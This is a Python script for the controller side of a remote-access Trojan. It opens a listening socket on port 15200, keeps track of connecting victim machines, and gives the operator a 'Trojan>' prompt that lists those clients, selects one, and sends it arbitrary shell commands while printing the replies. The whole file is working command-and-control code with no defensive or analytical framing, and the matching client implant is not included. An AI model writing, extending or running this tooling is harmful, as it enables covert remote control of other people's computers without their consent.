import socket
import threading
import sys
import time
from queue import Queue

NUMBER_OF_THREADS = 2
JOB_NUMBER = [1, 2]
queue = Queue()
all_connections = []
all_addresses = []


# Creating a socket
def socket_create():
    try:
        global host
        global port
        global s
        host = ''
        port = 15200
        s = socket.socket()
    except socket.error as msg:
        print("Socket creation error: " + str(msg))

# Bind socket to port
def socket_bind():
    try:
        global host
        global port
        global s
        print("Binding socket to port: " + str(port))
        s.bind((host, port))
        s.listen(5)
    except socket.error as msg:
        print("Socket binding failed." + str(msg) + "\nRetrying..." )
        time.sleep(5)
        socket_bind()

def accept_connections():
    for c in all_connections:
        c.close()
    del all_connections[:]
    del all_addresses[:]
    while 1:
        try:
            conn, addr_ = s.accept()
            conn.setblocking(1)
            all_connections.append(conn)
            all_addresses.append(addr_)
            print("\nEstablishing Comms... \nConnection Established: " + addr_[0])
        except:
            print("Error. Troubleshoot required.")

#Custom Shell interface
def begin_Trojan():
    while True:
        comm = input('Trojan> ')
        if comm == 'list':
            list_conns()
        elif 'sel' in comm:
            conn = grab_target(comm)
            if conn is not None:
                deploy_target_commands(conn)
        else:
            print("Unrecognized Command.")

def list_conns():
        result = ''
        for i, conn in enumerate(all_connections):
            try:
                conn.send(str.encode(' '))
                conn.recv(20480)
            except:
                del all_connections[i]
                del all_addresses[i]
                continue
            result += str(i) + '   ' + str(all_addresses[i][0]) + '   ' + str(all_addresses[i][1]) + '\n'
        print("***** Available Clients *****" + '\n' + result)

#
def grab_target(comm):
    try:
        target = comm.replace('sel ', '')
        target = int(target)
        conn = all_connections[target]
        print("Connected to: " + str(all_addresses[target][0]))
        print(str(all_addresses[target][0]) +  '> ', end = "")
        return conn
    except:
        print("Invalid Selection")
        return None


#
def deploy_target_commands(conn):
    while True:
        try:
            comm = input()
            if len(str.encode(comm)) > 0:
                conn.send(str.encode(comm))
                client_response = str(conn.recv(40960), "utf-8")
                print(client_response, end = "")
            if comm == 'quit':
                break
        except:
            print("Connection Lost")
            break


#
def create_threads():
    for _ in range (NUMBER_OF_THREADS):
        thred = threading.Thread(target =  work)
        thred.daemon = True
        thred.start()


def work():
    while True:
        x = queue.get()
        if x == 1:
            socket_create()
            socket_bind()
            accept_connections()
        if x == 2:
            begin_Trojan()
        queue.task_done()


#
def create_jobs():
    for x in JOB_NUMBER:
        queue.put(x)
    queue.join()
    return

def main():
    create_threads()
    create_jobs()

main()
